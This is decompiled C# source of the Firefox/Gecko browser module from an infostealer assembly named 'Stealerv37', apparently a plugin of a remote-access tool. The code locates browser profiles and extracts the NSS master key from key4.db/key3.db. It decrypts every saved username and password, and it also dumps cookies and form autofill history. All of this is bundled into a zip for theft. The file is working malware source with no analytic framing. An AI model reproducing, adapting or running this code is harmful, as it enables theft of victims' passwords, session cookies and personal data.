// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Browsers.Gecko
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Intelix.Helper.Sql;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Browsers;

public class Gecko : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Parallel.ForEach<string>((IEnumerable<string>) Paths.Gecko, (Action<string>) (browser =>
    {
      if (!Directory.Exists(browser))
        return;
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(browser), (Action<string>) (profile => this.ProfileCollect(zip, counter, browser, profile)));
    }));
  }

  private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
  {
    string str = browser + "\\Local State";
    string browsername = Paths.GetBrowserName(browser);
    string profilename = Path.GetFileName(profile);
    Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
    counterBrowser.Profile = profile;
    counterBrowser.BrowserName = browsername;
    Task.WaitAll(Task.Run((Action) (() => this.Password(zip, counterBrowser, profile, profilename, browsername))), Task.Run((Action) (() => this.Cookies(zip, counterBrowser, profile, profilename, browsername))), Task.Run((Action) (() => this.AutoFill(zip, counterBrowser, profile, profilename, browsername))));
    if ((long) counterBrowser.Cookies == 0L && (long) counterBrowser.Password == 0L && (long) counterBrowser.CreditCards == 0L && (long) counterBrowser.AutoFill == 0L && (long) counterBrowser.RestoreToken == 0L && (long) counterBrowser.MaskCreditCard == 0L && (long) counterBrowser.MaskedIban == 0L)
      return;
    counter.Browsers.Add(counterBrowser);
  }

  private void Password(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    string profile,
    string profilename,
    string browsername)
  {
    string path1 = Path.Combine(profile, "logins.json");
    if (!File.Exists(path1))
      return;
    string path2 = Path.Combine(profile, "key4.db");
    string path3 = Path.Combine(profile, "key3.db");
    byte[] masterKey = (byte[]) null;
    if (File.Exists(path2))
      masterKey = NssDumpMasterKey.Key4Database(path2);
    else if (File.Exists(path3))
      masterKey = NssDumpMasterKey.Key3Database(path3);
    if (masterKey == null && !NSSDecryptor.Initialize(profile))
      return;
    string input1 = File.ReadAllText(path1);
    if (string.IsNullOrEmpty(input1))
      return;
    MatchCollection source = Regex.Matches(input1, "\"hostname\":\\s*\"(.*?)\".*?\"encryptedUsername\":\\s*\"(.*?)\".*?\"encryptedPassword\":\\s*\"(.*?)\"", RegexOptions.Singleline);
    if (source.Count == 0)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.ForEach<Match>(source.Cast<Match>(), (Action<Match>) (match =>
    {
      string str1 = match.Groups[1].Value;
      string str2 = match.Groups[2].Value;
      string str3 = match.Groups[3].Value;
      string input2;
      string input3;
      if (masterKey == null)
      {
        input2 = NSSDecryptor.Decrypt(str2);
        input3 = NSSDecryptor.Decrypt(str3);
      }
      else
      {
        Asn1Der asn1Der = new Asn1Der();
        byte[] toParse1 = Convert.FromBase64String(str2);
        byte[] toParse2 = Convert.FromBase64String(str3);
        Asn1DerObject asn1DerObject1 = asn1Der.Parse(toParse1);
        Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse2);
        byte[] data1 = asn1DerObject1.Objects[0].Objects[1].Objects[1].Data;
        byte[] data2 = asn1DerObject1.Objects[0].Objects[1].Objects[0].Data;
        byte[] data3 = asn1DerObject2.Objects[0].Objects[1].Objects[1].Data;
        byte[] data4 = asn1DerObject2.Objects[0].Objects[1].Objects[0].Data;
        input2 = TripleDes.DecryptStringDesCbc(masterKey, data1, data2);
        input3 = TripleDes.DecryptStringDesCbc(masterKey, data3, data4);
      }
      string str4 = string.IsNullOrEmpty(input2) ? "" : Regex.Replace(input2, "[^\\u0020-\\u007F]", "");
      string str5 = string.IsNullOrEmpty(input3) ? "" : Regex.Replace(input3, "[^\\u0020-\\u007F]", "");
      if (string.IsNullOrEmpty(str1) || string.IsNullOrEmpty(str4) || string.IsNullOrEmpty(str5))
        return;
      lines.Add($"Hostname: {str1}\nUsername: {str4}\nPassword: {str5}\n\n");
      ++counterBrowser.Password;
    }));
    zip.AddTextFile($"Passwords\\Passwords_[{browsername}]{profilename}.txt", string.Join("", (IEnumerable<string>) lines.ToList<string>()));
  }

  private void Cookies(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    string profile,
    string profilename,
    string browsername)
  {
    string str1 = Path.Combine(profile, "cookies.sqlite");
    if (!File.Exists(str1))
      return;
    SqLite sSqLite = SqLite.ReadTable(str1, "moz_cookies");
    if (sSqLite == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str2 = sSqLite.GetValue(i, 3);
        string str3 = sSqLite.GetValue(i, 4);
        string str4 = sSqLite.GetValue(i, 2);
        string str5 = sSqLite.GetValue(i, 5);
        string str6 = sSqLite.GetValue(i, 6);
        if (string.IsNullOrEmpty(str3) || string.IsNullOrEmpty(str4) || string.IsNullOrEmpty(str5) || string.IsNullOrEmpty(str6))
          return;
        string[] strArray = new string[10]
        {
          str3,
          "\tTRUE\t",
          str5,
          "\tFALSE\t",
          str6,
          "\t",
          str4,
          "\t",
          str2,
          "\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.Cookies;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"Cookies\\Cookies_[{browsername}]{profilename}.txt", string.Join("", (IEnumerable<string>) lines.ToList<string>()));
  }

  private void AutoFill(
    InMemoryZip zip,
    Counter.CounterBrowser counterBrowser,
    string profile,
    string profilename,
    string browsername)
  {
    string str1 = Path.Combine(profile, "formhistory.sqlite");
    if (!File.Exists(str1))
      return;
    SqLite sSqLite = SqLite.ReadTable(str1, "moz_formhistory");
    if (sSqLite == null)
      return;
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Parallel.For(0, sSqLite.GetRowCount(), (Action<int>) (i =>
    {
      try
      {
        string str2 = sSqLite.GetValue(i, 1);
        string str3 = sSqLite.GetValue(i, 2);
        if (string.IsNullOrEmpty(str3) || string.IsNullOrEmpty(str2))
          return;
        string[] strArray = new string[5]
        {
          "Name: ",
          str2,
          "\nValue: ",
          str3,
          "\n\n"
        };
        lines.Add(string.Concat(strArray));
        ++counterBrowser.AutoFill;
      }
      catch
      {
      }
    }));
    zip.AddTextFile($"AutoFills\\AutoFill_[{browsername}]{profilename}.txt", string.Join("", (IEnumerable<string>) lines.ToList<string>()));
  }
}
